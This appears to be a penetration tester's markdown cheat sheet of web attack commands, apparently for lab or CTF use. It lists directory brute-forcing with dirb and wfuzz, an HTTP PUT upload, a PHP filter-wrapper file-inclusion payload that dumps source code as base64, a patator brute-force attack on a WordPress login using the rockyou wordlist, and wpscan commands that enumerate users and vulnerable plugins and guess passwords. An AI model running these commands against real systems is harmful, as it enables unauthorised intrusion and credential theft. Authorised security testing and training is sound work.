# Web

- [Scan](#scan)
- [Forced Browsing](#forced-browsing)
- [Manual Browsing with Burp](#manual-browsing-with-burp)
- [Scraping](#scraping)
- [Password Attacks](#password-attacks)
- [CMS](#cms)
- [PHP](#php)


## Scan

nikto -h $ip -p 80

wfuzz -c -z file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404 http://$ip

nmap NSE scripts

### Get Methods

PUT             
curl --upload-file test.txt -v --url hxxp://192.168.126.129/test/test.txt -0 --http1.0

DELETE          
Delete htaccess, or access control

## Forced Browsing

dirb http://$ip /usr/share/wordlists/dirb/common.txt

dirb http://$ip /usr/share/wordlists/dirb/vulns/apache.txt

dirb http://$ip /usr/share/wordlists/dirb/directory-list-2.3-medium.txt

## Manual Browsing with Burp

Add to Scope, Show only in-scope items

Browse all pages, enter data on all forms
Robots.txt
Dirb pages
Get Apache/PHP versions


http://$ip/?page=php://filter/convert.base64-encode/resource=login
curl -s "http://$ip/?page=php://filter/convert.base64-encode/resource=index" | grep -e '[^\ ]\{40,\}' | base64 -d

Inspect source code - JavaScript, XML, HTML
Inspect interesting images, strings
Identify CMS

|||
|-|-|
|Silverstripe|droopescan|
|Wordpress|wpscan, droopescan|
|Joomla|joomscan|
|Drupal|droopescan, cmsmap|
|Vbulletin|vbscan|


 /usr/share/wfuzz/wordlist/Injections and Grep - Extract for Error, SQL
 Cookies, parameters, passwords with Intruder
 Sessions with Sequencer

## Scraping 

cewl --write fscipt.lst -m 3 hxxp://127.0.0.1/fscript.html
cewl hxxps://en.wikipedia.org/wiki/List_of_occult_terms -m4 -d0 -w listofwords.txt
cd /opt/brutescrape && gedit sites.scrape and input websites to be scraped
wget $ip/index.html; grep “href=” index.html | cut -d “/” -f 3 | grep “\.” | cut -d '”' -f 1 | sort -u
wget $site | strings

## Password Attacks

patator http_fuzz url='http://$ip/wordpress/wp-login.php' method=POST \
body='log=admin&pwd=FILE0&wp-submit=Log+In&redirect_to=%2Fwordpress%2Fwp-admin%2F&testcookie=1' \
0='/usr/share/wordlists/rockyou.txt' follow=1 accept_cookie=1 -x ignore:fgrep='Lost your password?' \
header='Cookie: wordpress_test_cookie=WP+Cookie+check' -x quit:fgrep!='Lost your password?',clen!='-1'

## CMS

### Wordpress

wpscan -e vp -u 10.0.2.6/prehistoricforest (vulnerable plugins)
wpscan -e u -u 10.0.2.6/prehistoricforest (users)
wpscan -u 10.0.2.6/prehistoricforest --username tom --wordlist /usr/share/wordlists/rockyou.txt --threads 50
wpscan -u $ip --wordlist ~/list.dic --username elliot
wpscan --url $ip --enumerate vp

### Joomla

joomscan -u http://$ip:8081

## PHP
